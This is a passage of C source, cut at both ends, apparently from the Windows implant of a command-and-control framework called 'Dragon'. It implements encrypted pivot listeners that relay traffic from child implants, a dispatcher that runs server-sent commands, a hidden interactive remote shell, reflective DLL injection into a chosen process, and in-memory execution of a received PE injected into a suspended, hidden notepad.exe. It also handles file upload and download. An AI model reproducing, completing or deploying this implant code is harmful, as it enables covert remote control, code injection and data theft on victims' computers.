        crypto_kdf_derive_from_key(km, 64, 0x01, "DRAGONHS", shared);
        uint8_t key_enc_sub[KEY_LEN], base_iv_sub[NONCE_LEN];
        crypto_generichash(key_enc_sub, KEY_LEN,   km, 64, (uint8_t*)"enc", 3);
        crypto_generichash(base_iv_sub, NONCE_LEN, km, 64, (uint8_t*)"iv",  2);
        sodium_memzero(shared, sizeof shared);
        sodium_memzero(km,     sizeof km);
 
        PendingRoute *pending = malloc(sizeof(PendingRoute));
        if (!pending) {
            node->trans->close(conn); node->client_conn = NULL; continue;
        }
        pending->conn  = conn;
        pending->trans = node->trans;
        memcpy(pending->key_enc, key_enc_sub, KEY_LEN);
        memcpy(pending->base_iv, base_iv_sub, NONCE_LEN);
        pending->tx_ctr = malloc(sizeof(dr_ctr_t));
        pending->rx_ctr = malloc(sizeof(dr_ctr_t));
        if (!pending->tx_ctr || !pending->rx_ctr) {
            free(pending->tx_ctr); free(pending->rx_ctr); free(pending);
            node->trans->close(conn); node->client_conn = NULL; continue;
        }
        atomic_init(pending->tx_ctr, 0);
        atomic_init(pending->rx_ctr, 0);
        InitializeCriticalSection(&pending->mu);
        InitializeConditionVariable(&pending->route_ready);
        pending->route_assigned = FALSE;
        pending->assigned_id[0] = '\0';
 
        EnterCriticalSection(&pending_list_mutex);
        pending->next = pending_list;
        pending_list  = pending;
        LeaveCriticalSection(&pending_list_mutex);
 
        /* -- Send 0x00 with ID to child -- */
        PACKET_DRAGON packet = {0};
        snprintf(packet.opCode,   OPCODE_LEN, "%s", "0x00");
        snprintf(packet.payload,  ID_LEN,     "%s", current_id);
        packet.payload_size = (uint16_t)strlen(packet.payload);
        packet.target_level = 1;
 
        if (send_packet(conn, node->trans, &packet,
                        key_enc_sub, base_iv_sub, pending->tx_ctr) < 0) {
            abort_pending(pending, node, conn); continue;
        }
        printf("[LISTENER] 0x00 with ID father sent\n");
 
        /* -- Riceive 0x00 from child (MAC|father_id|port) -- */
        memset(&packet, 0, sizeof(packet));
        if (receive_packet(conn, node->trans, &packet,
                           key_enc_sub, base_iv_sub, pending->rx_ctr) != 0
            || strncmp(packet.opCode, "0x00", OPCODE_LEN) != 0) {
            abort_pending(pending, node, conn); continue;
        }
        printf("[LISTENER] 0x00 received from child, forwarding\n");
 
        /* -- Forwarding 0x00 upstream -- */
        if (LEVEL_CLIENT > 1) {
            if (send_packet(upstream_conn, upstream_trans, &packet,
                            key_enc_father, base_iv_father,
                            &tx_ctr_father) < 0) {
                abort_pending(pending, node, conn); continue;
            }
        } else {
            if (send_packet(upstream_conn, upstream_trans, &packet,
                            key_enc, base_iv, &tx_ctr) < 0) {
                abort_pending(pending, node, conn); continue;
            }
        }
 
        /* -- Wating receiveFromServer handle 0x0D and assign the ID --
         * No busy-wait: condition variable with timeout of 30 seconds. */
        char assigned_id[ID_LEN] = {0};
        BOOL timed_out = FALSE;
        EnterCriticalSection(&pending->mu);
        while (!pending->route_assigned) {
            if (!SleepConditionVariableCS(&pending->route_ready,
                                          &pending->mu, 30000)) {
                timed_out = TRUE;
                break;
            }
        }
        if (!timed_out)
            snprintf(assigned_id, ID_LEN, "%s", pending->assigned_id);
        LeaveCriticalSection(&pending->mu);
 
        if (timed_out) {
            /* pending could be already been removed from the list from
             * receiveFromServer in good race: abort_pending
             * handle both cases. */
            abort_pending(pending, node, conn);
            continue;
        }
 
        /* From here pending is already out of the pending list (removed from receiveFromServer).
         * No call remove_pending(pending). */
 
        /* -- Receive 0x10 from child (ephimeral pubkey for ECDH with server) -- */
        memset(&packet, 0, sizeof(packet));
        if (receive_packet(conn, node->trans, &packet,
                           key_enc_sub, base_iv_sub, pending->rx_ctr) != 0
            || strncmp(packet.opCode, "0x10", OPCODE_LEN) != 0) {
            printf("[LISTENER] 0x10 waited but not received\n");
            node->trans->close(conn);
            node->client_conn = NULL;
            DeleteCriticalSection(&pending->mu);
            free(pending->tx_ctr); free(pending->rx_ctr); free(pending);
            continue;
        }
        printf("[LISTENER] OK 0x10 received from child\n");
 
        /* Set the correct target_id before send */
        snprintf(packet.target_id, ID_LEN, "%s", assigned_id);
 
        /* -- Forward 0x10 upstream -- */
        if (LEVEL_CLIENT > 1) {
            if (send_packet(upstream_conn, upstream_trans, &packet,
                            key_enc_father, base_iv_father,
                            &tx_ctr_father) < 0) {
                printf("[LISTENER] forwarding 0x10 upstream FAILED\n");
                node->trans->close(conn);
                node->client_conn = NULL;
                DeleteCriticalSection(&pending->mu);
                free(pending->tx_ctr); free(pending->rx_ctr); free(pending);
                continue;
            }
        } else {
            if (send_packet(upstream_conn, upstream_trans, &packet,
                            key_enc, base_iv, &tx_ctr) < 0) {
                printf("[LISTENER] forwarding 0x10 upstream FAILED\n");
                node->trans->close(conn);
                node->client_conn = NULL;
                DeleteCriticalSection(&pending->mu);
                free(pending->tx_ctr); free(pending->rx_ctr); free(pending);
                continue;
            }
        }
        printf("[LISTENER] OK forwarding 0x10 upstream\n");
 
        /* -- Receive 0x13 from child (confirming handshake with server) -- */
        memset(&packet, 0, sizeof(packet));
        if (receive_packet(conn, node->trans, &packet,
                           key_enc_sub, base_iv_sub, pending->rx_ctr) != 0
            || strncmp(packet.opCode, "0x13", OPCODE_LEN) != 0) {
            printf("[LISTENER] 0x13 not received\n");
            node->trans->close(conn);
            node->client_conn = NULL;
            DeleteCriticalSection(&pending->mu);
            free(pending->tx_ctr); free(pending->rx_ctr); free(pending);
            continue;
        }
        printf("[LISTENER] OK 0x13 received from child\n");
 
        /* Set correct target_id before forwarding 0x13.
         * The server uses pack.target_id to identify sub-client
         * and send 0x12. Without this the server is not able to find the
         * sub-client and 0x12 is not ever sent. */
        snprintf(packet.target_id, ID_LEN, "%s", assigned_id);
 
        /* -- Forward 0x13 upstream -- */
        if (LEVEL_CLIENT > 1) {
            if (send_packet(upstream_conn, upstream_trans, &packet,
                            key_enc_father, base_iv_father,
                            &tx_ctr_father) < 0) {
                printf("[LISTENER] forward 0x13 upstream FAILED\n");
                node->trans->close(conn);
                node->client_conn = NULL;
                DeleteCriticalSection(&pending->mu);
                free(pending->tx_ctr); free(pending->rx_ctr); free(pending);
                continue;
            }
        } else {
            if (send_packet(upstream_conn, upstream_trans, &packet,
                            key_enc, base_iv, &tx_ctr) < 0) {
                printf("[LISTENER] forward 0x13 upstream FAILED\n");
                node->trans->close(conn);
                node->client_conn = NULL;
                DeleteCriticalSection(&pending->mu);
                free(pending->tx_ctr); free(pending->rx_ctr); free(pending);
                continue;
            }
        }
        printf("[LISTENER] OK forward 0x13 upstream - handshake complited\n");
 
        /* -- Loop of relay: child -> upstream --
         * receiveFromServer handles the opposit direction (upstream -> child)
         * through the routing table. */
        uint8_t  key_enc_down[KEY_LEN];
        uint8_t  base_iv_down[NONCE_LEN];
        memcpy(key_enc_down, key_enc_sub,  KEY_LEN);
        memcpy(base_iv_down, base_iv_sub,  NONCE_LEN);
        dr_ctr_t *rx_ctr_down = pending->rx_ctr;
 
        PACKET_DRAGON pkt;
        for (;;) {
            if (receive_packet(conn, node->trans, &pkt,
                               key_enc_down, base_iv_down,
                               rx_ctr_down) != 0) {
                printf("[RELAY] receive from child failed - disconnection\n");
                break;
            }
            if (LEVEL_CLIENT > 1) {
                if (send_packet(upstream_conn, upstream_trans, &pkt,
                                key_enc_father, base_iv_father,
                                &tx_ctr_father) != 0) {
                    printf("[RELAY] send to father failed\n"); break;
                }
            } else {
                if (send_packet(upstream_conn, upstream_trans, &pkt,
                                key_enc, base_iv, &tx_ctr) != 0) {
                    printf("[RELAY] send to father failed\n"); break;
                }
            }
        }
 
        /* -- Cleanup after the disconnection of the child -- */
        node->trans->close(conn);
        node->client_conn = NULL;
        DeleteCriticalSection(&pending->mu);
        free(pending->tx_ctr);
        free(pending->rx_ctr);
        free(pending);
        printf("[LISTENER] child disconnected, coming back to the listener\n");
    }
    return 0;
}

/* =========================================================================
 * add_listener
 *
 * Creates a new listener on the given port using the specified
 * transport. Allocates a ListenerNode, binds the socket, and
 * spawns listener_thread to handle incoming connections.
 * ====================================================================== */

void add_listener(const char *transport_name, int port) {
    transport_t *trans = transport_get(transport_name);
    if (!trans) { printf("[!] transport %s not found\n", transport_name); return; }
    int listen_fd = trans->listen(port);
    if (listen_fd < 0) { printf("[!] listen failed (port %d)\n", port); return; }
    ListenerNode* node = malloc(sizeof(ListenerNode));
    node->trans        = trans;
    node->listen_fd    = listen_fd;
    node->port         = port;
    node->client_conn  = NULL;
    node->client_thread= NULL;
    node->thread = CreateThread(NULL, 0, listener_thread, (LPVOID)node, 0, NULL);
    EnterCriticalSection(&listener_list_mutex);
    node->next    = listener_list;
    listener_list = node;
    LeaveCriticalSection(&listener_list_mutex);
    printf("[+] Listener active port %d\n", port);
}

/* =========================================================================
 * remove_listener
 *
 * Stops and removes the listener on the given port. Closes any
 * active child connection, terminates the listener thread, and
 * frees the ListenerNode. Thread-safe.
 * ====================================================================== */

void remove_listener(int port) {
    EnterCriticalSection(&listener_list_mutex);
    ListenerNode **curr = &listener_list;
    while (*curr) {
        if ((*curr)->port == port) {
            ListenerNode* to_del = *curr;
            *curr = to_del->next;
            if (to_del->client_conn) {
                to_del->trans->close(to_del->client_conn);
                to_del->client_conn = NULL;
            }
            if (to_del->thread) {
                TerminateThread(to_del->thread, 0);
                CloseHandle(to_del->thread);
            }
            free(to_del);
            printf("[-] Listener on port %d closed\n", port);
            break;
        }
        curr = &((*curr)->next);
    }
    LeaveCriticalSection(&listener_list_mutex);
}

/* =========================================================================
 * Exec in memory function
 * ====================================================================== */

typedef struct {
    HANDLE            hRead;
    transport_conn_t *conn;
    transport_t      *trans;
} PipeReaderCtx;

/* =========================================================================
 * pipe_reader
 *
 * Background thread that drains a pipe handle and sends each read
 * chunk to the server as command output (opcode 0x02). Used by
 * exec_native_in_sacrificial to capture the PE's stdout.
 * ====================================================================== */

static DWORD WINAPI pipe_reader(LPVOID arg)
{
    PipeReaderCtx *r = (PipeReaderCtx*)arg;
    char  buf[4096];
    DWORD nRead;
    while (ReadFile(r->hRead, buf, sizeof buf, &nRead, NULL) && nRead > 0)
        two_layer_send(r->conn, r->trans, "0x02", buf, (uint16_t)nRead);
    return 0;
}

/* =========================================================================
 * exec_native_in_sacrificial
 *
 * Executes a native PE in a sacrificial notepad.exe process.
 * Creates the process suspended, writes the PE and the reflective
 * loader shellcode into its memory, starts a pipe reader thread to
 * capture stdout, and launches the loader via CreateRemoteThread.
 * Terminates the sacrificial process when done.
 * ====================================================================== */

static void exec_native_in_sacrificial(ExecMemCtx *ctx)
{
    HANDLE hRead = NULL, hWrite = NULL;
    SECURITY_ATTRIBUTES sa = {sizeof sa, NULL, TRUE};
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        printf("[EXEC] CreatePipe failed: %lu\n", GetLastError());
        return;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {0};
    si.cb          = sizeof si;
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;
    si.hStdInput   = GetStdHandle(STD_INPUT_HANDLE);

    char sacrificial[MAX_PATH];
    GetSystemDirectoryA(sacrificial, MAX_PATH);
    strcat_s(sacrificial, MAX_PATH, "\\notepad.exe");

    char cmdLine[4096];
    if (ctx->args[0])
        snprintf(cmdLine, sizeof cmdLine, "notepad.exe %s", ctx->args);
    else
        strncpy(cmdLine, "notepad.exe", sizeof cmdLine - 1);

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(sacrificial, cmdLine, NULL, NULL, TRUE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        printf("[EXEC] CreateProcess failed: %lu\n", GetLastError());
        CloseHandle(hRead); CloseHandle(hWrite);
        return;
    }
    CloseHandle(hWrite); hWrite = NULL;

    /* -- Write PE raw into the child process -- */
    LPVOID remote_pe = VirtualAllocEx(pi.hProcess, NULL,
                                       (SIZE_T)ctx->pe_size,
                                       MEM_RESERVE | MEM_COMMIT,
                                       PAGE_READWRITE);
    if (!remote_pe) { printf("[EXEC] VirtualAllocEx PE failed\n"); goto cleanup; }

    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remote_pe,
                             ctx->pe_bytes, (SIZE_T)ctx->pe_size, &written)) {
        printf("[EXEC] WriteProcessMemory PE failed\n"); goto cleanup;
    }

    /* -- LoaderParam -- */
    LoaderParam lp = {0};
    lp.pe_base   = (uint8_t*)remote_pe;
    lp.fnLoadLib = (fn_LoadLibraryA_t)
                   GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    lp.fnGetProc = (fn_GetProcAddress_t)
                   GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    lp.fnVAlloc  = (fn_VirtualAlloc_t)
                   GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
    lp.fnFlush   = (fn_RtlFlushCache_t)
                   GetProcAddress(GetModuleHandleA("kernel32.dll"), "RtlFlushInstructionCache");

    SIZE_T loader_size  = reflective_loader_bin_len;
    LPVOID remote_param = VirtualAllocEx(pi.hProcess, NULL,
                                          sizeof(LoaderParam) + loader_size,
                                          MEM_RESERVE | MEM_COMMIT,
                                          PAGE_EXECUTE_READWRITE);
    if (!remote_param) { printf("[EXEC] VirtualAllocEx loader failed\n"); goto cleanup; }

        BOOL r1 = WriteProcessMemory(pi.hProcess, remote_param,
                                  &lp, sizeof lp, &written);
    printf("[EXEC] WPM LoaderParam: %s (%zu byte)\n",
           r1 ? "OK" : "FAIL", (size_t)written);

    uint8_t *remote_code = (uint8_t*)remote_param + sizeof(LoaderParam);
    BOOL r2 = WriteProcessMemory(pi.hProcess, remote_code,
                                  reflective_loader_bin, loader_size, &written);
    printf("[EXEC] WPM shellcode: %s (%zu byte)\n",
           r2 ? "OK" : "FAIL", (size_t)written);
    if (!r2) goto cleanup;

    PipeReaderCtx rctx = { hRead, ctx->conn, ctx->trans };
    HANDLE hReader = CreateThread(NULL, 0, pipe_reader, &rctx, 0, NULL);
    if (!hReader) {
        printf("[EXEC] CreateThread reader failed: %lu\n", GetLastError());
        goto cleanup;
    }

    HANDLE hRemote = CreateRemoteThread(
        pi.hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote_code,
        remote_param, 0, NULL);
    if (!hRemote) {
        printf("[EXEC] CreateRemoteThread failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        WaitForSingleObject(hReader, INFINITE);
        CloseHandle(hReader);
        goto cleanup;
    }

    printf("[EXEC] loader thread run, waiting...\n");

    WaitForSingleObject(hRemote, 60000);
    DWORD remoteExitCode = 0;
    GetExitCodeThread(hRemote, &remoteExitCode);
    printf("[EXEC] loader exit code: 0x%08lX\n", remoteExitCode);
    CloseHandle(hRemote);

    printf("[EXEC] loader completed\n");

    TerminateProcess(pi.hProcess, 0);

    printf("[EXEC] process terminated\n");

    WaitForSingleObject(hReader, INFINITE);

    printf("[EXEC] reader completed\n");
    CloseHandle(hReader);

    two_layer_send(ctx->conn, ctx->trans, "0x02", NULL, 0);
    printf("[EXEC] Execution completed\n");

cleanup:
    WaitForSingleObject(pi.hProcess, 1000);
    TerminateProcess(pi.hProcess, 0); 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (hRead)  CloseHandle(hRead);
    if (hWrite) CloseHandle(hWrite);
}

/* =========================================================================
 * exec_mem_thread
 *
 * Entry point for in-memory execution. Checks whether the PE is a
 * .NET assembly or a native binary and dispatches accordingly.
 * .NET path is not yet implemented. Frees the PE buffer and context
 * on exit.
 * ====================================================================== */

DWORD WINAPI exec_mem_thread(LPVOID arg)
{
    ExecMemCtx *ctx = (ExecMemCtx*)arg;
 
    if (pe_is_dotnet(ctx->pe_bytes)) {
        printf("[EXEC] Assembly .NET\n");
        //implement .NET execution in memory
        const char *msg = "[EXEC] .NET exec not yet available\n";
        two_layer_send(ctx->conn, ctx->trans, "0x02",
                        msg, (uint16_t)strlen(msg));
        two_layer_send(ctx->conn, ctx->trans, "0x02", NULL, 0);
    } else {
        printf("[EXEC] PE native - reflective loading\n");
        exec_native_in_sacrificial(ctx);
    }
 
    free(ctx->pe_bytes);
    free(ctx);
    return 0;
}

/* =========================================================================
 * receiveFromServer  -  thread principale di ricezione
 * ====================================================================== */

/* =========================================================================
 * receiveFromServer
 *
 * Main receive loop running in a dedicated thread. Decrypts incoming
 * packets and dispatches based on opcode:
 *   - Packets for this client: command exec, shell I/O, file
 *     upload/download, exec-in-memory, listener/route management.
 *   - Packets for other clients: forwarded via the routing table.
 * Handles both single-layer (level 1) and double-layer (level > 1)
 * decryption. Runs until the connection drops.
 * ====================================================================== */

typedef struct { transport_conn_t *conn; transport_t *trans; } ThreadConn;

DWORD WINAPI receiveFromServer(LPVOID data) {
    ThreadConn *ctx               = (ThreadConn*)data;
    transport_conn_t *server_conn  = ctx->conn;
    transport_t      *server_trans = ctx->trans;
    PACKET_DRAGON received_packet;
 
    while (1) {
        int recv_result;
        if (LEVEL_CLIENT > 1)
            recv_result = receive_packet(server_conn, server_trans,
                                         &received_packet,
                                         key_enc_father, base_iv_father,
                                         &rx_ctr_father);
        else
            recv_result = receive_packet(server_conn, server_trans,
                                         &received_packet,
                                         key_enc, base_iv, &rx_ctr);
 
        if (recv_result != 0) {
            printf("[ERROR] recv failed, retrying...\n");
            Sleep(1000);
            continue;
        }
 
        printf("[DEBUG] Rx opCode=%s size=%d level=%d\n",
               received_packet.opCode,
               received_packet.payload_size,
               received_packet.target_level);
 
        if (received_packet.target_level == LEVEL_CLIENT
            && packet_is_for_me(&received_packet))
        {
            uint8_t decrypted_payload[sizeof(received_packet.payload)];
            const uint8_t *payload_ptr =
                (const uint8_t *)received_packet.payload;
 
            if (LEVEL_CLIENT > 1) {
                if (strncmp(received_packet.opCode, "0x05", OPCODE_LEN) == 0) {
                    if (dragon_decrypt_payload(key_enc, base_iv, &rx_ctr_shell,
                                               payload_ptr,
                                               received_packet.payload_size,
                                               decrypted_payload) != 0) {
                        printf("[ERROR] Failed to decrypt shell payload\n");
                        continue;
                    }
                } else {
                    if (dragon_decrypt_payload(key_enc, base_iv, &rx_ctr,
                                               payload_ptr,
                                               received_packet.payload_size,
                                               decrypted_payload) != 0) {
                        printf("[ERROR] Failed to decrypt payload\n");
                        continue;
                    }
                }
                payload_ptr = decrypted_payload;
                uint16_t clear_len = received_packet.payload_size - TAG_LEN;
                received_packet.payload_size = clear_len;
            }
 
            /* -- EXEC_CMD -- */
            if (strncmp(received_packet.opCode, "0x02", OPCODE_LEN) == 0) {
                char cmd_buf[2041];
                size_t plen = received_packet.payload_size;
                if (plen > sizeof cmd_buf - 1) plen = sizeof cmd_buf - 1;
                if (!payload_ptr) return -1;
                memcpy(cmd_buf, payload_ptr, plen);
                cmd_buf[plen] = '\0';
                execute_command(cmd_buf, server_conn, server_trans);
                two_layer_send(server_conn, server_trans, "0x02", NULL, 0);
            }
 
            /* -- SHELL_START -- */
            else if (strncmp(received_packet.opCode, "0x03", OPCODE_LEN) == 0) {
                tx_ctr_shell = 0;
                rx_ctr_shell = 0;
                if (!g_shell || !g_shell->active)
                    start_interactive_shell(server_conn, server_trans);
                if (IS_HTTP)  http_set_shell_active(server_conn, 1);
                if (IS_HTTPS) https_set_shell_active(server_conn, 1);
            }
 
            /* -- SHELL_DATA -- */
            else if (!strncmp(received_packet.opCode, "0x05", OPCODE_LEN)
                     && g_shell && g_shell->active)
            {
                DWORD wr;
                WriteFile(g_shell->hStdiWrite,
                          payload_ptr, received_packet.payload_size,
                          &wr, NULL);
                char marker[] = "echo __SHELL_END__\r\n";
                WriteFile(g_shell->hStdiWrite, marker,
                          (DWORD)(sizeof marker - 1), &wr, NULL);
            }
 
            /* -- SHELL_END -- */
            else if (strncmp(received_packet.opCode, "0x06", OPCODE_LEN) == 0
                     && g_shell && g_shell->active)
            {
                if (g_shell->hStdiWrite) {
                    DWORD written;
                    const char exit_cmd[] = "exit\r\n";
                    WriteFile(g_shell->hStdiWrite, exit_cmd,
                              (DWORD)(sizeof exit_cmd - 1), &written, NULL);
                    CloseHandle(g_shell->hStdiWrite);
                    g_shell->hStdiWrite = NULL;
                }
                if (g_shell->hStdoutRead) {
                    CloseHandle(g_shell->hStdoutRead);
                    g_shell->hStdoutRead = NULL;
                }
                if (g_shell->hProcess) {
                    if (WaitForSingleObject(g_shell->hProcess, 200) == WAIT_TIMEOUT)
                        TerminateProcess(g_shell->hProcess, 0);
                    WaitForSingleObject(g_shell->hProcess, INFINITE);
                    CloseHandle(g_shell->hProcess);
                    g_shell->hProcess = NULL;
                }
                if (g_shell->hThreadHandle) {
                    CloseHandle(g_shell->hThreadHandle);
                    g_shell->hThreadHandle = NULL;
                }
                if (g_shell->hThread) {
                    WaitForSingleObject(g_shell->hThread, INFINITE);
                    CloseHandle(g_shell->hThread);
                    g_shell->hThread = NULL;
                }
                g_shell->active = 0;
                free(g_shell);
                g_shell = NULL;
                if (IS_HTTP)  http_set_shell_active(server_conn, 0);
                if (IS_HTTPS) https_set_shell_active(server_conn, 0);
                printf("\n[+] Remote Shell closed from the server\n");
                fflush(stdout);
            }
 
            /* -- DLL INJECT -- */
            else if (strncmp(received_packet.opCode, "0x07", OPCODE_LEN) == 0) {
                if (!awaiting_dll && received_packet.payload_size == sizeof(DWORD)) {
                    if (!payload_ptr) { fprintf(stderr, "0x07: payload NULL\n"); break; }
                    memcpy(&target_pid, payload_ptr, sizeof(DWORD));
                    dll_buffer = malloc(16 * 1024 * 1024);
                    dll_offset = 0;
                    awaiting_dll = 1;
                } else if (awaiting_dll && received_packet.payload_size > 0) {
                    memcpy(dll_buffer + dll_offset, payload_ptr,
                           received_packet.payload_size);
                    dll_offset += received_packet.payload_size;
                    if (received_packet.payload_size < sizeof(payload_ptr)) {
                        inject_dll_reflective_in_target(dll_buffer, dll_offset, target_pid);
                        free(dll_buffer); dll_buffer = NULL;
                        dll_offset = 0; target_pid = 0; awaiting_dll = 0;
                    }
                }
            }
 
            /* -- START LISTENER -- */
            else if (strncmp(received_packet.opCode, "0x0B", OPCODE_LEN) == 0) {
                char buf[64];
                size_t plen = received_packet.payload_size;
                if (plen >= sizeof(buf)) plen = sizeof(buf) - 1;
                memcpy(buf, payload_ptr, plen);
                buf[plen] = '\0';
                char *transport = strtok(buf, " ");
                char *port_str  = strtok(NULL, " ");
                if (!transport || !port_str) {
                    printf("[ERROR] invalid listener payload\n"); continue;
                }
                add_listener(transport, atoi(port_str));
            }
 
            /* -- STOP LISTENER -- */
            else if (strncmp(received_packet.opCode, "0x0C", OPCODE_LEN) == 0) {
                remove_listener(atoi((const char*)payload_ptr));
            }
 
            /* -- REQ LISTENERS -- */
            else if (strncmp(received_packet.opCode, "0x0E", OPCODE_LEN) == 0) {
                if (received_packet.payload_size == 0) {
                    char *txt = get_listeners_text();
                    if (txt) {
                        fragment_and_send(server_conn, server_trans, "0x0E", txt);
                        free(txt);
                    }
                } else {
                    printf("%.*s", received_packet.payload_size, payload_ptr);
                }
                continue;
            }
 
            /* -- REQ ROUTES -- */
            else if (strncmp(received_packet.opCode, "0x0F", OPCODE_LEN) == 0) {
                if (received_packet.payload_size == 0) {
                    char *txt = get_routes_text();
                    if (txt) {
                        fragment_and_send(server_conn, server_trans, "0x0F", txt);
                        free(txt);
                    }
                }
                continue;
            }

            /* -- FILE UPLOAD START -- */
            else if(strncmp(received_packet.opCode, "0x17", OPCODE_LEN) == 0) {
                if(received_packet.payload_size < 9) continue;
                uint64_t total_size = 0;
                memcpy(&total_size, payload_ptr, 8);

                char remote_path[512] = {0};
                size_t pathlen = received_packet.payload_size - 8;
                if(pathlen >= sizeof remote_path) pathlen = sizeof remote_path - 1;
                memcpy(remote_path, payload_ptr + 8, pathlen);
                remote_path[pathlen] = '\0';

                if (g_upload_fp) {fclose(g_upload_fp); g_upload_fp = NULL; }
                g_upload_fp = fopen(remote_path, "wb");
                g_upload_bytes = 0;

                if(!g_upload_fp) {
                    printf("[UPLOAD] Error: create %s\n", remote_path);
                } else {
                    strncpy(g_upload_path, remote_path, sizeof g_upload_path - 1);
                    printf("[UPLOAD] Creation: %s (%llu byte)\n", remote_path, (unsigned long long)total_size);
                }
            }

            /* -- FILE_UPLOAD_CHUNK (0x18) -- */
            else if (strncmp(received_packet.opCode, "0x18", OPCODE_LEN) == 0) {
                if(!g_upload_fp || received_packet.payload_size < 4) continue;

                size_t data_len = received_packet.payload_size - 4;
                if (data_len > 0) {
                    fwrite(payload_ptr + 4, 1, data_len, g_upload_fp);
                    g_upload_bytes += data_len;
                }
            }

            /* -- FILE_UPLOAD_END (0x19) -- */
            else if (strncmp(received_packet.opCode, "0x19", OPCODE_LEN) == 0) {
                if(g_upload_fp) {
                    fflush(g_upload_fp);
                    fclose(g_upload_fp);
                    g_upload_fp = NULL;
                    printf("[UPLOAD] Complete: %s (%llu byte)\n", g_upload_path, (unsigned long long)g_upload_bytes);
                    g_upload_bytes = 0;
                }
                // ACK to server
                uint8_t status = 0;
                two_layer_send(server_conn, server_trans, "0x1A", &status, 1);
            }
            else if (strncmp(received_packet.opCode, "0x14", OPCODE_LEN) == 0) {
                char remote_path[512] = {0};
                size_t plen = received_packet.payload_size;
                if (plen >= sizeof(remote_path)) {
                    plen = sizeof remote_path - 1;
                }
                memcpy(remote_path, payload_ptr, plen);
                remote_path[plen] = '\0';

                printf("[DOWNLOAD] File requested: %s\n", remote_path);

                DownloadCtx *ctx = malloc(sizeof *ctx);
                if(ctx) {
                    strncpy(ctx->path, remote_path, sizeof ctx->path - 1);
                    ctx->conn = server_conn;
                    ctx->trans = server_trans;
                    HANDLE t = CreateThread(NULL, 0, download_thread, ctx, 0, NULL);
                    if (t) CloseHandle(t);
                    else free(ctx);
                }
            } else if (strncmp(received_packet.opCode, "0x1B", OPCODE_LEN) == 0) {
                if (received_packet.payload_size < 9) continue;
 
                if (g_pe_buf) { free(g_pe_buf); g_pe_buf = NULL; }
                g_pe_args[0]   = '\0';
                g_pe_args_done = 0;
                g_pe_received  = 0;
 
                memcpy(&g_pe_size, payload_ptr + 1, 8);
 
                g_pe_buf = (uint8_t*)malloc((size_t)g_pe_size);
                if (!g_pe_buf) {
                    printf("[EXEC] malloc failed (%llu byte)\n",
                           (unsigned long long)g_pe_size);
                    g_pe_size = 0;
                    continue;
                }
                g_pe_conn  = server_conn;
                g_pe_trans = server_trans;
                printf("[EXEC] START - waiting PE (%llu byte)\n",
                       (unsigned long long)g_pe_size);
            } else if (strncmp(received_packet.opCode, "0x1D", OPCODE_LEN) == 0) {
                if (!g_pe_buf) continue;
 
                if (received_packet.payload_size == 0) {
                    g_pe_args_done = 1;
                    printf("[EXEC] ARGS received (%zu byte)\n",
                           strlen(g_pe_args));
                } else {
                    size_t cur = strlen(g_pe_args);
                    size_t add = received_packet.payload_size;
                    if (cur + add < sizeof g_pe_args - 1) {
                        memcpy(g_pe_args + cur, payload_ptr, add);
                        g_pe_args[cur + add] = '\0';
                    } else {
                        printf("[EXEC] ARGS buffer overflow\n");
                    }
                }
            } else if (strncmp(received_packet.opCode, "0x1C", OPCODE_LEN) == 0) {
                if (!g_pe_buf || received_packet.payload_size < 4) continue;
 
                size_t data_len = received_packet.payload_size - 4;
                if (g_pe_received + data_len > g_pe_size) {
                    printf("[EXEC] Overflow buffer PE - reset\n");
                    free(g_pe_buf); g_pe_buf = NULL;
                    g_pe_size = 0; g_pe_received = 0;
                    g_pe_args[0] = '\0'; g_pe_args_done = 0;
                    continue;
                }
                // payload_ptr + 4 skip the chunk_index (4 byte)
                memcpy(g_pe_buf + g_pe_received, payload_ptr + 4, data_len);
                g_pe_received += data_len;
 
                if (g_pe_received >= g_pe_size) {
                    printf("[EXEC] PE completed (%llu byte) - start\n",
                           (unsigned long long)g_pe_size);
 
                    ExecMemCtx *ectx = (ExecMemCtx*)malloc(sizeof *ectx);
                    if (ectx) {
                        memset(ectx, 0, sizeof *ectx);
                        ectx->pe_bytes = g_pe_buf;
                        ectx->pe_size  = g_pe_size;
                        strncpy(ectx->args, g_pe_args,
                                sizeof ectx->args - 1);
                        ectx->conn  = g_pe_conn;
                        ectx->trans = g_pe_trans;
 
                        HANDLE t = CreateThread(NULL, 0,
                                                exec_mem_thread, ectx, 0, NULL);
                        if (t) CloseHandle(t);
                        else { free(g_pe_buf); free(ectx); }
                    } else {
                        free(g_pe_buf);
                    }
                    g_pe_buf       = NULL;
                    g_pe_size      = 0;
                    g_pe_received  = 0;
                    g_pe_args[0]   = '\0';
                    g_pe_args_done = 0;
                }
            }
        }
 
        /* -- Packet not fo me: routing / forwarding -- */
        else {
 
            if (strncmp(received_packet.opCode, "0x0D", OPCODE_LEN) == 0) {
                printf("RECEIVED ID FOR ROUTE ENTRY\n");
 
                char new_child_id[ID_LEN];
                snprintf(new_child_id, ID_LEN, "%s",
                         received_packet.target_id);
 
                char payload_copy[256];
                size_t plen = received_packet.payload_size;
                if (plen >= sizeof(payload_copy)) plen = sizeof(payload_copy) - 1;
                memcpy(payload_copy, received_packet.payload, plen);
                payload_copy[plen] = '\0';
 
                char *token    = strtok(payload_copy, "|");
                int   port     = 0;
                char  id_father[ID_LEN] = {0};
                if (token) port = atoi(token);
                token = strtok(NULL, "|");
                if (token) snprintf(id_father, ID_LEN, "%s", token);
 
                if (received_packet.target_level == LEVEL_CLIENT + 1) {
                    ListenerNode *listener = find_listener_by_port(port);
                    if (!listener) {
                        printf("[ERROR] Listener not found port %d\n", port);
                        continue;
                    }
 
                    PendingRoute *p = NULL;
                    EnterCriticalSection(&pending_list_mutex);
